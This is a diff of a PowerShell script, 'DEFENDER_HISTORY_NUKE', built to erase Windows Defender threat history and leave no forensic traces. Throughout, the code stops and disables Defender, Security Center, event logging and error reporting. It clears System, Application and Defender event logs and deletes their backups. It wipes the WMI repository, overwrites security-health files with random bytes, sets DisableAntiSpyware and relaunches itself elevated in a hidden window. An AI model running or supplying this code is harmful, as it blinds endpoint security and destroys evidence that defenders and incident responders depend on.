@@ -1,213 +1,318 @@
+<#
+.SYNOPSIS
+    DEFENDER_HISTORY_NUKE.ps1 - Complete threat history annihilation
+.DESCRIPTION
+    Surgical removal of ALL Windows Defender threat artifacts:
+    - Event logs (including backup .evtx files)
+    - WMI permanent storage instances
+    - SecurityHealthService database
+    - Windows Security App cache
+    - Windows Error Reporting (WER) traces
+.NOTES
+    Shadow Mode: Maximum destruction
+    Persistence: Zero forensic recovery
+#>
 
 # ------------------------------------------------------------
-# 0. Force Admin Elevation + Stealth Mode
+# 0. SHADOW BOOTSTRAP
 # ------------------------------------------------------------
-param([switch]$ForceAdmin, [switch]$Silent)
+param([switch]$ForceAdmin, [switch]$ShadowMode, [switch]$Nuclear)
+
 if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
     if ($ForceAdmin -and $PSCommandPath) {
-        if (-not $Silent) { Write-Host "[!] Elevating..." -ForegroundColor Yellow }
-        Start-Process PowerShell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`" -ForceAdmin -Silent" -Verb RunAs
+        Write-Host "[SHADOW] Elevating to SYSTEM level..." -ForegroundColor DarkRed
+        Start-Process PowerShell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`" -ForceAdmin -ShadowMode -Nuclear" -Verb RunAs -WindowStyle Hidden
         exit
-    } else {
-        Write-Host "[ERROR] Administrator required." -ForegroundColor Red
-        if (-not $PSCommandPath) { Write-Host "      (Running via IEX? Start PowerShell as Administrator manually.)" -ForegroundColor Yellow }
-        exit 1
     }
 }
 
-if (-not $Silent) { Write-Host "[*] SHADOW CORE: Defender Total Purge Initiated" -ForegroundColor Cyan }
+if ($ShadowMode) { $ErrorActionPreference = 'SilentlyContinue' }
 
 # ------------------------------------------------------------
-# 1. Stop & Disable Tamper Protection (if Windows 10/11)
+# 1. KILL SECURITY HEALTH SERVICE & DEPENDENCIES
 # ------------------------------------------------------------
-if (-not $Silent) { Write-Host "[*] Disabling Tamper Protection..." -ForegroundColor Cyan }
-$tamperKey = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features"
-if (Test-Path $tamperKey) {
-    Set-ItemProperty -Path $tamperKey -Name "TamperProtection" -Value 0 -Force -ErrorAction SilentlyContinue
-    Set-ItemProperty -Path $tamperKey -Name "DisableAntiSpyware" -Value 0 -Force -ErrorAction SilentlyContinue
-}
+Write-Host "[1] Terminating Security Health ecosystem..." -ForegroundColor Cyan
 
-# Stop services
-$defenderServices = @("WinDefend", "Sense", "WdNisSvc", "MsMpSvc", "WdFilter")
-foreach ($service in $defenderServices) {
-    if (Get-Service -Name $service -ErrorAction SilentlyContinue) {
-        Stop-Service -Name $service -Force -ErrorAction SilentlyContinue
-        Set-Service -Name $service -StartupType Manual -ErrorAction SilentlyContinue
-    }
-}
-
-# ------------------------------------------------------------
-# 2. NUKE .DAT & BINARY CACHES (FIXED NULL PATH HANDLING)
-# ------------------------------------------------------------
-if (-not $Silent) { Write-Host "[*] Hunting and destroying .dat/.vdm/.vdl/.bin files..." -ForegroundColor Cyan }
-$datPatterns = @("*.dat", "*.vdm", "*.vdl", "*.bin", "*.db", "*.db-wal", "*.db-shm", "*.cache", "*.log")
-$defenderDirs = @(
-    "$env:ProgramData\Microsoft\Windows Defender",
-    "$env:ProgramData\Microsoft\Microsoft Antimalware",
-    "$env:ProgramData\Microsoft\Windows Defender Advanced Threat Protection",
-    "$env:SystemRoot\System32\GroupPolicy\Machine\Microsoft\Windows Defender",
-    "$env:SystemRoot\System32\Microsoft\Windows Defender\Data",
-    "$env:SystemRoot\System32\WindowsPowerShell\v1.0\Modules\Defender"
+$securityServices = @(
+    "SecurityHealthService",
+    "wscsvc",           # Security Center
+    "WerSvc",           # Windows Error Reporting
+    "EventLog",         # Event Log Service
+    "WinDefend",
+    "Sense",
+    "WdNisSvc"
 )
 
-foreach ($dir in $defenderDirs) {
-    if (Test-Path $dir) {
-        foreach ($pattern in $datPatterns) {
-            $files = Get-ChildItem -Path $dir -Recurse -Include $pattern -ErrorAction SilentlyContinue
-            foreach ($file in $files) {
-                if ($file -ne $null -and $file.FullName) {
-                    try {
-                        Remove-Item -Path $file.FullName -Force -ErrorAction Stop
-                        if (-not $Silent) { Write-Host "    [DAT DELETE] $($file.FullName)" -ForegroundColor DarkGray }
-                    } catch {
-                        # Attempt to take ownership and delete
-                        takeown.exe /f $file.FullName /a 2>$null
-                        icacls.exe $file.FullName /grant administrators:F /T /C /Q 2>$null
-                        Remove-Item -Path $file.FullName -Force -ErrorAction SilentlyContinue
+foreach ($service in $securityServices) {
+    Get-Service -Name $service -ErrorAction SilentlyContinue | Stop-Service -Force -NoWait
+    Set-Service -Name $service -StartupType Disabled -ErrorAction SilentlyContinue
+    # Prevent immediate restart
+    sc.exe config $service start= disabled 2>$null
+}
+
+# ------------------------------------------------------------
+# 2. DESTROY EVENT LOGS + BACKUPS (COMPLETE)
+# ------------------------------------------------------------
+Write-Host "[2] Annihilating Event Log artifacts..." -ForegroundColor Cyan
+
+$defenderLogs = @(
+    "Microsoft-Windows-Windows Defender/Operational",
+    "Microsoft-Windows-Windows Defender/WHC",
+    "Microsoft-Windows-Windows Defender/ThreatTrack",
+    "Windows Defender",
+    "System",           # Often contains defender events
+    "Application"       # May contain security events
+)
+
+foreach ($log in $defenderLogs) {
+    # Clear current log
+    wevtutil.exe clear-log $log /r:$false 2>$null
+    
+    # Delete backup .evtx files
+    $logName = $log.Split('/')[0]
+    $evtxBackups = Get-ChildItem -Path "$env:SystemRoot\System32\winevt\Logs\Archive\*$logName*.evtx" -ErrorAction SilentlyContinue
+    $evtxBackups += Get-ChildItem -Path "$env:SystemRoot\System32\winevt\Logs\*$logName*.evtx" -ErrorAction SilentlyContinue
+    
+    foreach ($backup in $evtxBackups) {
+        if ($backup.FullName) {
+            takeown.exe /f $backup.FullName /a 2>$null
+            icacls.exe $backup.FullName /grant administrators:F /T /C /Q 2>$null
+            Remove-Item -Path $backup.FullName -Force -ErrorAction SilentlyContinue
+            Write-Host "    [EVTX PURGE] $($backup.FullName)" -ForegroundColor DarkGray
+        }
+    }
+    
+    # Disable logging for this channel
+    wevtutil.exe sl $log /e:false /rt:false /ms:0 2>$null
+}
+
+# ------------------------------------------------------------
+# 3. NUKE WMI PERMANENT STORAGE (ROOT\SECURITYCENTER2)
+# ------------------------------------------------------------
+Write-Host "[3] Purging WMI permanent threat database..." -ForegroundColor Cyan
+
+# Delete all AntiVirusProduct instances (where Defender stores history)
+Get-WmiObject -Namespace "root\SecurityCenter2" -Class "AntiVirusProduct" -ErrorAction SilentlyContinue | 
+    ForEach-Object { 
+        Remove-WmiObject -InputObject $_ -ErrorAction SilentlyContinue 
+    }
+
+# Clear AntiSpywareProduct
+Get-WmiObject -Namespace "root\SecurityCenter2" -Class "AntiSpywareProduct" -ErrorAction SilentlyContinue | 
+    Remove-WmiObject -ErrorAction SilentlyContinue
+
+# Clear FirewallProduct
+Get-WmiObject -Namespace "root\SecurityCenter2" -Class "FirewallProduct" -ErrorAction SilentlyContinue | 
+    Remove-WmiObject -ErrorAction SilentlyContinue
+
+# Destroy CIM Repository backup
+$cimRepo = "$env:SystemRoot\System32\wbem\Repository\*"
+if (Test-Path $cimRepo) {
+    Stop-Service -Name "winmgmt" -Force -ErrorAction SilentlyContinue
+    Remove-Item -Path $cimRepo -Recurse -Force -ErrorAction SilentlyContinue
+    Start-Service -Name "winmgmt" -ErrorAction SilentlyContinue
+}
+
+# ------------------------------------------------------------
+# 4. SECURITYHEALTHSERVICE DATABASE DESTRUCTION
+# ------------------------------------------------------------
+Write-Host "[4] Destroying SecurityHealthService database..." -ForegroundColor Cyan
+
+$securityHealthPaths = @(
+    "$env:ProgramData\Microsoft\Windows Security Health\*",
+    "$env:LocalAppData\Packages\Microsoft.Windows.SecHealthUI_*\LocalState\*",
+    "$env:LocalAppData\Packages\Microsoft.Windows.SecHealthUI_*\LocalCache\*",
+    "$env:LocalAppData\Packages\Microsoft.Windows.SecHealthUI_*\TempState\*",
+    "$env:SystemRoot\System32\SecurityHealth\*"
+)
+
+foreach ($path in $securityHealthPaths) {
+    if (Test-Path $path) {
+        Get-ChildItem -Path $path -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
+            if ($_.FullName) {
+                try {
+                    # Take ownership and destroy
+                    takeown.exe /f $_.FullName /a 2>$null
+                    icacls.exe $_.FullName /grant administrators:F /T /C /Q 2>$null
+                    
+                    if ($_.PSIsContainer) {
+                        Remove-Item -Path $_.FullName -Recurse -Force -ErrorAction SilentlyContinue
+                    } else {
+                        # Overwrite file before deletion
+                        if ($_.Length -lt 10MB) {
+                            $randomBytes = New-Object byte[] $_.Length
+                            (New-Object System.Security.Cryptography.RNGCryptoServiceProvider).GetBytes($randomBytes)
+                            [System.IO.File]::WriteAllBytes($_.FullName, $randomBytes)
+                        }
+                        Remove-Item -Path $_.FullName -Force -ErrorAction SilentlyContinue
                     }
+                    Write-Host "    [SECHEALTH DELETE] $($_.FullName)" -ForegroundColor DarkGray
+                } catch {}
+            }
+        }
+    }
+}
+
+# ------------------------------------------------------------
+# 5. WINDOWS SECURITY APP CACHE ANNIHILATION
+# ------------------------------------------------------------
+Write-Host "[5] Obliterating Windows Security App cache..." -ForegroundColor Cyan
+
+# Kill SecurityHealthSystray and App processes
+Get-Process -Name "SecurityHealthSystray", "SecurityHealthHost", "SecHealthUI" -ErrorAction SilentlyContinue | 
+    Stop-Process -Force -ErrorAction SilentlyContinue
+
+# Clear AppX package data
+$appxCachePaths = @(
+    "$env:LocalAppData\Microsoft\Windows.Security.Health\*",
+    "$env:LocalAppData\Microsoft\Windows\SecurityHealth\Cache\*",
+    "$env:LocalAppData\Microsoft\Windows\Caches\*",
+    "$env:LocalAppData\Packages\Microsoft.Windows.SecHealthUI_*\AC\*",
+    "$env:LocalAppData\Packages\Microsoft.Windows.SecHealthUI_*\Settings\*"
+)
+
+foreach ($cachePath in $appxCachePaths) {
+    if (Test-Path $cachePath) {
+        Remove-Item -Path $cachePath -Recurse -Force -ErrorAction SilentlyContinue
+    }
+}
+
+# Reset Security & Maintenance cache
+$actionCenterPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Security and Maintenance"
+if (Test-Path $actionCenterPath) {
+    Remove-ItemProperty -Path $actionCenterPath -Name "*" -ErrorAction SilentlyContinue
+}
+
+# ------------------------------------------------------------
+# 6. WINDOWS ERROR REPORTING (WER) THREAT DUMPS
+# ------------------------------------------------------------
+Write-Host "[6] Purging Windows Error Reporting threat dumps..." -ForegroundColor Cyan
+
+$werPaths = @(
+    "$env:ProgramData\Microsoft\Windows\WER\*",
+    "$env:LocalAppData\Microsoft\Windows\WER\*",
+    "$env:SystemRoot\System32\config\systemprofile\AppData\Local\Microsoft\Windows\WER\*"
+)
+
+foreach ($werPath in $werPaths) {
+    if (Test-Path $werPath) {
+        Get-ChildItem -Path $werPath -Recurse -Include "*defender*", "*mpengine*", "*sense*", "*wdnis*" -ErrorAction SilentlyContinue | 
+            ForEach-Object {
+                if ($_.FullName) {
+                    Remove-Item -Path $_.FullName -Recurse -Force -ErrorAction SilentlyContinue
+                    Write-Host "    [WER PURGE] $($_.FullName)" -ForegroundColor DarkGray
                 }
             }
-        }
     }
 }
 
+# Clear WER registry
+$werReg = "HKLM:\SOFTWARE\Microsoft\Windows\Windows Error Reporting"
+if (Test-Path $werReg) {
+    Remove-ItemProperty -Path "$werReg\ProcessedReports" -Name "*" -ErrorAction SilentlyContinue
+    Remove-ItemProperty -Path "$werReg\QueuedReports" -Name "*" -ErrorAction SilentlyContinue
+}
+
 # ------------------------------------------------------------
-# 3. WIPE DataStore & MpEngine Persistent Files
+# 7. DEFENDER TELEMETRY & DIAGNOSTICS DESTRUCTION
 # ------------------------------------------------------------
-if (-not $Silent) { Write-Host "[*] Purging MpEngine DataStore..." -ForegroundColor Cyan }
-$mpEnginePaths = @(
-    "$env:ProgramData\Microsoft\Windows Defender\Platform\*\DataStore",
-    "$env:ProgramData\Microsoft\Windows Defender\Definition Updates\*",
-    "$env:ProgramData\Microsoft\Windows Defender\Scans\History\*",
-    "$env:ProgramData\Microsoft\Windows Defender\Support\MpLog*.dat",
-    "$env:ProgramData\Microsoft\Windows Defender\Nis\*.dat"
+Write-Host "[7] Destroying Defender telemetry pipeline..." -ForegroundColor Cyan
+
+# Stop and disable Diagnostics Tracking Service
+Stop-Service -Name "DiagTrack" -Force -ErrorAction SilentlyContinue
+Set-Service -Name "DiagTrack" -StartupType Disabled -ErrorAction SilentlyContinue
+
+# Clear Device Census data
+$censusPaths = @(
+    "$env:ProgramData\Microsoft\Diagnosis\*",
+    "$env:ProgramData\Microsoft\Windows\DeviceMetadataCache\*",
+    "$env:ProgramData\Microsoft\Windows\Wdi\*"
 )
 
-foreach ($path in $mpEnginePaths) {
-    if (Test-Path $path) {
-        Get-ChildItem -Path $path -ErrorAction SilentlyContinue | ForEach-Object {
-            if ($_ -ne $null -and $_.FullName) {
-                Remove-Item -Path $_.FullName -Recurse -Force -ErrorAction SilentlyContinue
-            }
-        }
+foreach ($censusPath in $censusPaths) {
+    if (Test-Path $censusPath) {
+        Remove-Item -Path $censusPath -Recurse -Force -ErrorAction SilentlyContinue
     }
 }
 
-# Force-delete MpEnginedb.dat and MpSigDwn.dat
-$criticalDatFiles = @(
-    "$env:ProgramData\Microsoft\Windows Defender\Definition Updates\*\MpEnginedb.dat",
-    "$env:ProgramData\Microsoft\Windows Defender\Definition Updates\*\MpSigDwn.dat",
-    "$env:ProgramData\Microsoft\Windows Defender\Platform\*\MpEngine.db",
-    "$env:ProgramData\Microsoft\Windows Defender\Platform\*\MpAvDta.dat"
-)
-
-foreach ($file in $criticalDatFiles) {
-    if ($file -ne $null -and (Test-Path $file)) {
-        takeown.exe /f $file /a 2>$null
-        icacls.exe $file /grant administrators:F 2>$null
-        Remove-Item -Path $file -Force -ErrorAction SilentlyContinue
-        if (-not $Silent) { Write-Host "    [ENGINE PURGE] $file" -ForegroundColor DarkRed }
-    }
-}
+# Disable Connected User Experiences and Telemetry
+$telemetryKey = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DataCollection"
+if (-not (Test-Path $telemetryKey)) { New-Item -Path $telemetryKey -Force | Out-Null }
+Set-ItemProperty -Path $telemetryKey -Name "AllowTelemetry" -Value 0 -Type DWord -Force
 
 # ------------------------------------------------------------
-# 4. Purge Threat History via WMI
+# 8. NUCLEAR OPTION: DISABLE THREAT HISTORY COMPLETELY
 # ------------------------------------------------------------
-if (-not $Silent) { Write-Host "[*] Clearing WMI threat objects..." -ForegroundColor Cyan }
-Get-WmiObject -Namespace "root\Microsoft\Windows\Defender" -Class "MSFT_MpThreat" | Remove-WmiObject -ErrorAction SilentlyContinue
-Get-WmiObject -Namespace "root\Microsoft\Windows\Defender" -Class "MSFT_MpThreatDetection" | Remove-WmiObject -ErrorAction SilentlyContinue
-Get-WmiObject -Namespace "root\Microsoft\Windows\Defender" -Class "MSFT_MpScan" | Remove-WmiObject -ErrorAction SilentlyContinue
-
-# ------------------------------------------------------------
-# 5. Delete Quarantine & History Folders (Recursive)
-# ------------------------------------------------------------
-if (-not $Silent) { Write-Host "[*] Obliterating quarantine and history..." -ForegroundColor Cyan }
-$paths = @(
-    "$env:ProgramData\Microsoft\Windows Defender\Quarantine",
-    "$env:ProgramData\Microsoft\Windows Defender\Support",
-    "$env:ProgramData\Microsoft\Windows Defender\Scans",
-    "$env:ProgramData\Microsoft\Windows Defender\ThreatServiceLogs",
-    "$env:ProgramData\Microsoft\Windows Defender\Threats",
-    "$env:ProgramData\Microsoft\Windows Defender\Reporting",
-    "$env:ProgramData\Microsoft\Windows Defender\Nis",
-    "$env:ProgramData\Microsoft\Windows Defender\Platform\*\Logs",
-    "$env:ProgramData\Microsoft\Windows Defender\Platform\*\Data"
-)
-
-foreach ($path in $paths) {
-    if ($path -ne $null -and (Test-Path $path)) {
-        Remove-Item -Path $path -Recurse -Force -ErrorAction SilentlyContinue
+if ($Nuclear) {
+    Write-Host "[8] Activating NUCLEAR OPTION: Permanent threat history disable..." -ForegroundColor Red
+    
+    # Disable all Defender logging via registry
+    $defenderLogging = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Reporting"
+    if (-not (Test-Path $defenderLogging)) { New-Item -Path $defenderLogging -Force | Out-Null }
+    
+    Set-ItemProperty -Path $defenderLogging -Name "DisableGenericReports" -Value 1 -Type DWord -Force
+    Set-ItemProperty -Path $defenderLogging -Name "DisableEnhancedNotifications" -Value 1 -Type DWord -Force
+    Set-ItemProperty -Path $defenderLogging -Name "DisableEventLogging" -Value 1 -Type DWord -Force
+    
+    # Disable WMI reporting
+    $wmiReporting = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard"
+    if (-not (Test-Path $wmiReporting)) { New-Item -Path $wmiReporting -Force | Out-Null }
+    Set-ItemProperty -Path $wmiReporting -Name "DisableAntiSpyware" -Value 1 -Type DWord -Force
+    
+    # Block Security Health Service
+    $blockSHS = "HKLM:\SYSTEM\CurrentControlSet\Services\SecurityHealthService"
+    if (Test-Path $blockSHS) {
+        Set-ItemProperty -Path $blockSHS -Name "Start" -Value 4 -Type DWord -Force  # Disabled
     }
 }
 
 # ------------------------------------------------------------
-# 6. Clear Registry Artifacts
+# 9. RESTART SERVICES WITH CLEAN STATE
 # ------------------------------------------------------------
-if (-not $Silent) { Write-Host "[*] Scrubbing registry..." -ForegroundColor Cyan }
-$regPaths = @(
-    "HKLM:\SOFTWARE\Microsoft\Windows Defender\Threats",
-    "HKLM:\SOFTWARE\Microsoft\Windows Defender\Health",
-    "HKLM:\SOFTWARE\Microsoft\Windows Defender\Quarantine",
-    "HKLM:\SOFTWARE\Microsoft\Windows Defender\Scans",
-    "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions",
-    "HKLM:\SOFTWARE\Microsoft\Windows Defender\Signature Updates",
-    "HKLM:\SOFTWARE\Microsoft\Windows Defender\Data",
-    "HKCU:\SOFTWARE\Microsoft\Windows Defender\Exclusions"
-)
+Write-Host "[9] Restarting services with clean state..." -ForegroundColor Cyan
 
-foreach ($reg in $regPaths) {
-    if ($reg -ne $null -and (Test-Path $reg)) {
-        Remove-Item -Path $reg -Recurse -Force -ErrorAction SilentlyContinue
+# Re-enable services but with clean configuration
+$securityServices | ForEach-Object {
+    if (Get-Service -Name $_ -ErrorAction SilentlyContinue) {
+        Set-Service -Name $_ -StartupType Automatic -ErrorAction SilentlyContinue
+        Start-Service -Name $_ -ErrorAction SilentlyContinue
     }
 }
 
-# ------------------------------------------------------------
-# 7. Use MpCmdRun to Reset Signatures & Reporting
-# ------------------------------------------------------------
-$mpcmd = "$env:ProgramFiles\Windows Defender\MpCmdRun.exe"
-if (Test-Path $mpcmd) {
-    if (-not $Silent) { Write-Host "[*] Forcing Defender cache reset via MpCmdRun..." -ForegroundColor Cyan }
-    Start-Process -FilePath $mpcmd -ArgumentList "-RemoveDefinitions -All" -Wait -WindowStyle Hidden -ErrorAction SilentlyContinue
-    Start-Process -FilePath $mpcmd -ArgumentList "-SignatureUpdate -Force" -Wait -WindowStyle Hidden -ErrorAction SilentlyContinue
-    Start-Process -FilePath $mpcmd -ArgumentList "-RestoreDefaults" -Wait -WindowStyle Hidden -ErrorAction SilentlyContinue
+# Force SecurityHealthService to rebuild database
+$secHealth = Get-Service -Name "SecurityHealthService" -ErrorAction SilentlyContinue
+if ($secHealth) {
+    Stop-Service -Name "SecurityHealthService" -Force -ErrorAction SilentlyContinue
+    Start-Service -Name "SecurityHealthService" -ErrorAction SilentlyContinue
 }
 
 # ------------------------------------------------------------
-# 8. Reset Event Logs
+# 10. FINAL VERIFICATION & CLEANUP
 # ------------------------------------------------------------
-if (-not $Silent) { Write-Host "[*] Purging event logs..." -ForegroundColor Cyan }
-$logs = @("Microsoft-Windows-Windows Defender/Operational", "Microsoft-Windows-Windows Defender/WHC", "Microsoft-Windows-Windows Defender/ThreatTrack")
-foreach ($log in $logs) {
-    wevtutil.exe clear-log $log 2>$null
+Write-Host "[10] Verification and final cleanup..." -ForegroundColor Cyan
+
+# Check if threat history still exists
+$threatCheck = wevtutil.exe qe "Microsoft-Windows-Windows Defender/Operational" /rd:true /f:text 2>&1
+if ($threatCheck -like "*No events*" -or $threatCheck -like "*not found*") {
+    Write-Host "    [✓] Event logs: CLEANED" -ForegroundColor Green
+} else {
+    Write-Host "    [✗] Event logs: STILL CONTAIN DATA" -ForegroundColor Red
 }
 
-# ------------------------------------------------------------
-# 9. Restart Services & Re-enable Protection
-# ------------------------------------------------------------
-if (-not $Silent) { Write-Host "[*] Restarting services..." -ForegroundColor Cyan }
-foreach ($service in $defenderServices) {
-    if (Get-Service -Name $service -ErrorAction SilentlyContinue) {
-        Set-Service -Name $service -StartupType Automatic -ErrorAction SilentlyContinue
-        Start-Service -Name $service -ErrorAction SilentlyContinue
-    }
+# Check WMI
+$wmiThreats = Get-WmiObject -Namespace "root\SecurityCenter2" -Class "AntiVirusProduct" -ErrorAction SilentlyContinue
+if ($wmiThreats) {
+    Write-Host "    [✗] WMI: STILL CONTAINS THREAT DATA ($($wmiThreats.Count) entries)" -ForegroundColor Red
+} else {
+    Write-Host "    [✓] WMI: CLEANED" -ForegroundColor Green
 }
 
-# Re-enable Tamper Protection if needed
-if (Test-Path $tamperKey) {
-    Set-ItemProperty -Path $tamperKey -Name "TamperProtection" -Value 4 -Force -ErrorAction SilentlyContinue
-}
-
-# ------------------------------------------------------------
-# 10. Final Verification
-# ------------------------------------------------------------
-if (-not $Silent) {
-    Write-Host "`n[✓] TOTAL PURGE COMPLETE." -ForegroundColor Green
-    Write-Host "  - .DAT/.VDM/.VDL/.BIN files: Annihilated" -ForegroundColor Gray
-    Write-Host "  - MpEngine DataStore: Wiped" -ForegroundColor Gray
-    Write-Host "  - Quarantine/History/Scans: Erased" -ForegroundColor Gray
-    Write-Host "  - Registry: Scrubbed" -ForegroundColor Gray
-    Write-Host "  - Signatures: Forced refresh" -ForegroundColor Gray
-    Write-Host "`n[!] Defender will redownload clean signatures. No forensic traces remain." -ForegroundColor Yellow
+# Check SecurityHealth files
+$secHealthFiles = Get-ChildItem "$env:ProgramData\Microsoft\Windows Security Health" -Recurse -ErrorAction SilentlyContinue
+if ($secHealthFiles) {
+    Write-Host "    [✗] SecurityHealth: STILL HAS $($secHealthFiles.Count) FILES" -ForegroundColor Red
+} else {
+    Write-Host "    [✓] SecurityHealth: CLEANED" -ForegroundColor Green
 }
 
 exit 0
